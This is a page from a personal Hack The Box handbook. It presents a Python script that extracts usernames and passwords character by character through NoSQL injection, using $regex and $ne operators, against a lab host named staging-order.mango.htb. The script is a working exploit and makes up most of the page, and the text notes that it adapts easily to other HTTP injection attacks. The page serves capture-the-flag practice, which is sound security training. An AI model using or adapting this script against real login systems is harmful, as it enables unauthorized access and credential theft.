<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><link rel=icon type=image/ico href=https://www.arjenwiersma.nl//favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://www.arjenwiersma.nl//favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://www.arjenwiersma.nl//favicon-32x32.png><link rel=icon type=image/png sizes=192x192 href=https://www.arjenwiersma.nl//android-chrome-192x192.png><link rel=apple-touch-icon sizes=180x180 href=https://www.arjenwiersma.nl//apple-touch-icon.png><meta name=description content><meta property="og:image" content="https://www.arjenwiersma.nl/social.png"><title>Injection based brute forcer (HTTP) | Arjen Wiersma
</title><link rel=canonical href=https://www.arjenwiersma.nl/handbook/500_code/bruteforcer/><link rel=stylesheet href=/assets/combined.min.a6824bbee0d90d5af09fed9b70395ce7076b615e315037455d903314e96ef91b.css media=all></head><body class=auto><div class=content><header><div class=header><h1 class=header-title>Arjen Wiersma</h1><div class=flex><p class=small><a href=/>/home</a></p><p class=small><a href=/posts>/posts</a></p><p class=small><a href=/tags>/tags</a></p></div></div></header><main class=main><div class=breadcrumbs><a href=/>Home</a>
<span class=breadcrumbs-separator>> </span><a href=/handbook/>The Hack The Box handbook</a>
<span class=breadcrumbs-separator>> </span><a href=/handbook/500_code/>ðŸ““ Custom Software</a>
<span class=breadcrumbs-separator>> </span><a class=breadcrumbs-current href=/handbook/500_code/bruteforcer/>Injection based brute forcer (HTTP)</a></div><div><div class=single-intro-container><h1 class=single-title>Injection based brute forcer (HTTP)</h1><p class=single-readtime></p></div><div class=single-content><p>Below you will find a bruteforcer for HTTP based NoSQL injections. Obviously, this code is easily adjusted to any type of injection attack through HTTP.</p><p>The code will start by iterating over the alphabet, digits and punctuation characters. When a username is found that starts with one of them, through <code>check_username</code>, the rest of the username is brute forced in <code>brute_username</code>. When completing the username, the user's password is also attacked using <code>brute_password</code>.</p><p>All characters are escaped using <code>re.escape</code> instead of using a blacklist. A smart builder will put regular expression characters into a bruteforcible password to make it a little harder.</p><p>The <code>pwntools</code> library is used to provide logging and animations.</p><div class="src src-python"><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=font-style:italic>#!/usr/bin/python3</span>
</span></span><span style=display:flex><span><span style=font-weight:700>import</span> <span style=font-weight:700>requests</span>
</span></span><span style=display:flex><span><span style=font-weight:700>import</span> <span style=font-weight:700>string</span>
</span></span><span style=display:flex><span><span style=font-weight:700>import</span> <span style=font-weight:700>re</span>
</span></span><span style=display:flex><span><span style=font-weight:700>from</span> <span style=font-weight:700>pwn</span> <span style=font-weight:700>import</span> *
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p1 = log.progress(<span style=font-style:italic>&#34;Brute Force&#34;</span>)
</span></span><span style=display:flex><span>p1.status(<span style=font-style:italic>&#34;Brute forcing...&#34;</span>)
</span></span><span style=display:flex><span>time.sleep(1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p2 = log.progress(<span style=font-style:italic>&#34;Username&#34;</span>)
</span></span><span style=display:flex><span>p3 = log.progress(<span style=font-style:italic>&#34;Password&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>alfabet=string.ascii_lowercase+string.ascii_uppercase+string.digits+string.punctuation
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=font-weight:700>def</span> check_username(username):
</span></span><span style=display:flex><span>    resp = requests.post(<span style=font-style:italic>&#34;http://staging-order.mango.htb&#34;</span>,
</span></span><span style=display:flex><span>                         data={<span style=font-style:italic>&#34;username[$regex]&#34;</span>:<span style=font-style:italic>f</span><span style=font-style:italic>&#34;^</span><span style=font-weight:700;font-style:italic>{</span>re.escape(username)<span style=font-weight:700;font-style:italic>}</span><span style=font-style:italic>.*&#34;</span>,
</span></span><span style=display:flex><span>                               <span style=font-style:italic>&#34;password[$ne]&#34;</span>:<span style=font-style:italic>&#34;admin&#34;</span>,
</span></span><span style=display:flex><span>                               <span style=font-style:italic>&#34;login&#34;</span>:<span style=font-style:italic>&#34;login&#34;</span> })
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=font-weight:700>if</span> <span style=font-style:italic>b</span><span style=font-style:italic>&#34;Under Plantation&#34;</span> <span style=font-weight:700>in</span> resp.content:
</span></span><span style=display:flex><span>        <span style=font-weight:700>return</span> <span style=font-weight:700>True</span>
</span></span><span style=display:flex><span>    <span style=font-weight:700>return</span> <span style=font-weight:700>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=font-weight:700>def</span> brute_username(found):
</span></span><span style=display:flex><span>    <span style=font-weight:700>for</span> c <span style=font-weight:700>in</span> alfabet:
</span></span><span style=display:flex><span>        p1.status(<span style=font-style:italic>f</span><span style=font-style:italic>&#34;Trying with the </span><span style=font-weight:700;font-style:italic>{</span>c<span style=font-weight:700;font-style:italic>}</span><span style=font-style:italic> character&#34;</span>)
</span></span><span style=display:flex><span>        <span style=font-weight:700>if</span> check_username(found+c):
</span></span><span style=display:flex><span>            p2.status(found+c)
</span></span><span style=display:flex><span>            <span style=font-weight:700>return</span> brute_username(found+c)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    passwd = brute_password(found,<span style=font-style:italic>&#34;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=font-weight:700>def</span> brute_password(username,found):
</span></span><span style=display:flex><span>    <span style=font-weight:700>for</span> c <span style=font-weight:700>in</span> alfabet:
</span></span><span style=display:flex><span>        p1.status(<span style=font-style:italic>f</span><span style=font-style:italic>&#34;Trying with the </span><span style=font-weight:700;font-style:italic>{</span>c<span style=font-weight:700;font-style:italic>}</span><span style=font-style:italic> character&#34;</span>)
</span></span><span style=display:flex><span>        resp = requests.post(<span style=font-style:italic>&#34;http://staging-order.mango.htb&#34;</span>,
</span></span><span style=display:flex><span>                             data={<span style=font-style:italic>&#34;username&#34;</span>:username,
</span></span><span style=display:flex><span>                                   <span style=font-style:italic>&#34;password[$regex]&#34;</span>:<span style=font-style:italic>f</span><span style=font-style:italic>&#34;^</span><span style=font-weight:700;font-style:italic>{</span>re.escape(found)<span style=font-weight:700;font-style:italic>}{</span>re.escape(c)<span style=font-weight:700;font-style:italic>}</span><span style=font-style:italic>.*&#34;</span>,
</span></span><span style=display:flex><span>                                   <span style=font-style:italic>&#34;login&#34;</span>:<span style=font-style:italic>&#34;login&#34;</span> })
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=font-weight:700>if</span> <span style=font-style:italic>b</span><span style=font-style:italic>&#34;Under Plantation&#34;</span> <span style=font-weight:700>in</span> resp.content:
</span></span><span style=display:flex><span>            p3.status(found+c)
</span></span><span style=display:flex><span>            <span style=font-weight:700>return</span> brute_password(username, found+c)
</span></span><span style=display:flex><span>    <span style=font-weight:700>return</span> found
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=font-weight:700>for</span> c <span style=font-weight:700>in</span> alfabet:
</span></span><span style=display:flex><span>    <span style=font-weight:700>if</span> check_username(c):
</span></span><span style=display:flex><span>        brute_username(c)
</span></span><span style=display:flex><span>        p2 = log.progress(<span style=font-style:italic>&#34;Username&#34;</span>)
</span></span><span style=display:flex><span>        p3 = log.progress(<span style=font-style:italic>&#34;Password&#34;</span>)</span></span></code></pre></div></div></div><div class=back-to-top><a href=#top>back to top</a></div></div></main></div><footer><p>Powered by
<a href=https://gohugo.io/>Hugo</a>
and
<a href=https://github.com/tomfran/typo>tomfran/typo</a></p></footer></body><script>function isAuto(){return document.body.classList.contains("auto")}function setTheme(){if(!isAuto())return;document.body.classList.remove("auto");let e="light";window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches&&(e="dark"),document.body.classList.add(e)}function invertBody(){document.body.classList.toggle("dark"),document.body.classList.toggle("light")}isAuto()&&window.matchMedia("(prefers-color-scheme: dark)").addListener(invertBody),setTheme()</script></html>